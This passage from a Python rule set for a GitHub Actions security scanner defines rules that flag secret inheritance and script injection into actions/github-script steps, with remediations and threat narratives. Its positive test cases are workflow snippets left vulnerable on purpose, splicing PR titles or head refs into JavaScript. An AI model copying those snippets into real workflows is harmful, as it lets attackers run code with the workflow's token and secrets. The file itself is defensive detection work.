            "jobs:\n  call:\n    uses: owner/repo/.github/workflows/reusable.yml@v1\n    secrets: inherit",
            "jobs:\n  call:\n    uses: ./.github/workflows/reusable.yml\n    secrets:\n      TOKEN: ${{ secrets.TOKEN }}",
        ],
        stride=["I", "E"],
        threat_narrative=(
            "A local reusable workflow that receives every caller secret expands the credential "
            "blast radius to every action and command in that callee. The repository controls both "
            "sides, so the risk is lower than a third-party callee, but compromise of the callee's "
            "transitive dependencies still exposes the caller's complete secret set."
        ),
    ),
    # =========================================================================
    # SEC4-GH-024: actions/github-script script: interpolates opaque step output
    # =========================================================================
    Rule(
        id="SEC4-GH-024",
        title="actions/github-script script: body interpolates opaque step output",
        severity=Severity.MEDIUM,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        review_needed=True,
        confidence="low",
        description=(
            "An ``actions/github-script`` step's ``script:`` parameter "
            "interpolates ``${{ steps.<id>.outputs.<name> }}`` into "
            "JavaScript source. Step outputs can carry attacker-"
            "controlled bytes from an upstream producer, but the source "
            "is not visible at the consuming line. Review the producer "
            "before treating this as exploitable."
        ),
        pattern=GithubScriptStepOutputPattern(),
        remediation=(
            "Route the step output through ``env:`` and read it via "
            "``process.env`` inside github-script. If the upstream "
            "producer reads fork PR, issue, comment, branch, or file "
            "content, validate the value before using it in JavaScript."
        ),
        reference="https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-an-intermediate-environment-variable",
        test_positive=[
            (
                "      - uses: actions/github-script@v7\n"
                "        with:\n"
                "          script: |\n"
                "            core.info('${{ steps.meta.outputs.version }}')\n"
            ),
        ],
        test_negative=[
            (
                "      - uses: actions/github-script@v7\n"
                "        env:\n"
                "          VERSION: ${{ steps.meta.outputs.version }}\n"
                "        with:\n"
                "          script: |\n"
                "            core.info(process.env.VERSION)\n"
            ),
            (
                "      - uses: actions/github-script@v7\n"
                "        script: |\n"
                "          core.info('${{ steps.meta.outputs.version }}')\n"
            ),
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Step outputs are opaque transit channels. A prior step can "
            "capture attacker-controlled bytes into ``GITHUB_OUTPUT``; "
            "a later github-script step then splices that output into JS "
            "source. This rule preserves the signal while requiring "
            "review because the taint source is upstream."
        ),
        incidents=[],
    ),
    Rule(
        id="SEC4-GH-025",
        title="actions/github-script script: body interpolates attacker-controlled context",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "An ``actions/github-script`` step's ``script:`` "
            "parameter interpolates ``${{ ... }}`` of an attacker-"
            "controllable context (PR title, issue body, head ref, "
            "comment body, workflow_dispatch input, or a transit-"
            "tainted step output) into the JavaScript body.  "
            "github-script evaluates the body as JS via an eval-"
            "style mechanism; bytes containing ``'``, ``\\n``, or "
            "``${...}`` break out of the JS string literal and "
            "execute arbitrary JavaScript in the runner — with "
            "whatever permissions the workflow has bound (often "
            "write access to code or issues).  This is the JS-"
            "context sibling of SEC4-GH-004 (shell sink) and "
            "SEC4-GH-021 (step-output transit into shell)."
        ),
        pattern=GithubScriptDangerousContextPattern(),
        remediation=(
            "Never interpolate attacker-controllable ``${{ ... }}`` "
            "directly into a github-script ``script:`` body.  "
            "Route through the step's ``env:`` mapping and read "
            "via ``process.env``:\n"
            "  - uses: actions/github-script@v7\n"
            "    env:\n      PR_TITLE: ${{ github.event.pull_request.title }}\n"
            "    with:\n      script: |\n        const title = process.env.PR_TITLE;\n"
            "        github.rest.issues.createComment({ body: title });\n"
            "``process.env.X`` returns a plain string with no JS "
            "evaluation, so attacker bytes are treated as data.  "
            "If the value must round-trip through a shell command, "
            "use ``await exec.exec('cmd', [process.env.X])`` rather "
            "than string concatenation."
        ),
        reference="https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-an-intermediate-environment-variable",
        test_positive=[
            # Block-scalar script body with PR-title splice.
            (
                "      - uses: actions/github-script@v7\n"
                "        with:\n"
                "          script: |\n"
                "            const t = '${{ github.event.pull_request.title }}';\n"
            ),
            # Same shape with a pinned SHA — must still be recognised.
            (
                "      - uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3\n"
                "        with:\n"
                "          script: |\n"
                "            const t = '${{ github.head_ref }}';\n"
            ),
        ],
        test_negative=[
            # Safe env-routing pattern.
            (
                "      - uses: actions/github-script@v7\n"
                "        env:\n          PR_TITLE: ${{ github.event.pull_request.title }}\n"
                "        with:\n          script: |\n"
                "            const t = process.env.PR_TITLE;\n"
            ),
            # Non-attacker context (server-minted).
            (
                "      - uses: actions/github-script@v7\n"
                "        with:\n          script: |\n"
                "            const repo = '${{ github.repository }}';\n"
            ),
            # Different action with a script: parameter — not github-script.
            (
                "      - uses: example/some-other@v1\n"
                "        with:\n          script: echo ${{ github.event.pull_request.title }}\n"
            ),
        ],
        stride=["T", "E"],
        threat_narrative=(
            "github-script is a popular action for embedding JS "
            "logic inline in workflows — paths-filter, PR comment "
            "automations, branch sync, label updates, etc.  When "
            "the JS body is built from attacker-controllable "
            "GitHub context via ``${{ }}`` interpolation, the "
            "string-literal escape is trivial (a single quote or "
            "newline in a PR title is sufficient).  An attacker "
            "who controls the splice runs JS as the workflow, "
            "which means access to the GITHUB_TOKEN, the bound "
            "secrets, and any further actions the workflow has "
            "wired up.  The remediation (env: + process.env) is "
            "the same shape as SEC4-GH-004's (env: + shell var) "
            "and SEC4-GH-021's (env: + shell var) — same defence-"
            "in-depth principle applied to a different sink."
        ),
        incidents=[],
    ),
]
